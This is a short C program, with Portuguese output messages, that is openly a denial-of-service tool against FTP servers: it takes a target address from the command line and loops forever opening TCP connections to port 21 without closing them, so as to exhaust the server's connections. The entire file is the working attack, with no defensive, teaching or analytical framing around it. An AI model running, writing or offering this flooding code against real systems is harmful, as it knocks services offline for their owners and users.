#include <stdio.h>
#include <sys/socket.h>
#include <netdb.h>

int main (int argc, char* argv[]) {
	int mysocket;
	int connection;

	struct sockaddr_in target;

	printf("============================================\n");
	printf("Realizando ataque no serviço FTP do endereço: %s\n", argv[1]);
	printf("============================================\n");

	printf("Executando DoS...\n");

	while(1){
		mysocket = socket(AF_INET, SOCK_STREAM, 0);
		target.sin_family = AF_INET;
		target.sin_port = htons(21);
		target.sin_addr.s_addr = inet_addr(argv[1]);

		connection = connect(mysocket, (struct sockaddr *)&target, sizeof(target));
	}

	return 0;
}
